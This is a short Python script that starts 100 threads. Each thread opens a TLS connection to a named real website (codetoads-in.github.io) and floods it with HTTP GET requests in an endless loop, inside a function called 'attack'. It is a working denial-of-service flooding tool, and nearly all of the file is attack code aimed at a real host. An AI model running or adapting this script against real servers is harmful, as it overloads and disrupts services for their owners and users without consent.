from threading import Thread as th
#import requests    #very slow, includes lots of processing
import socket
import ssl #https support

def attack():
    request = b"GET / HTTP/1.1\nHost: codetoads-in.github.io\n\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss = ssl.wrap_socket(s)
    ss.connect(("codetoads-in.github.io", 443))
    #i=1
    while True:#i<3:
        ss.send(request)
        ss.recv(1024) # don't need this but in its absence the server halts the connection
        #print(r)
        #i+=1

threads=[]
for i in range(100):
    threads.append(th(target=attack,args=[]))
    threads[-1].start()
    #threads[-1].join()